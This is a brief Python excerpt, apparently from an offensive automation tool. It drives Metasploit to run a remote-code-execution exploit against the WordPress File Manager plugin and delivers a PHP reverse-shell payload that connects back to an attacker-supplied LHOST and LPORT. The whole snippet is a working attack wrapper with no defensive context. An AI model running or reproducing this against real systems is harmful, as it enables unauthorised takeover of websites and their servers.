...
async def main():
    ...
    with console.status("[bold green]Configuring Metasploit payload..."):
        ...
        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="multi/http/wp_file_manager_rce",
            payload_module_name="php/reverse_perl",
            RHOSTS=user_params["RHOSTS"], RPORT=user_params["RPORT"], TARGETURI=user_params["TARGETURI"], LHOST=user_params["LHOST"], LPORT=user_params["LPORT"]
    )
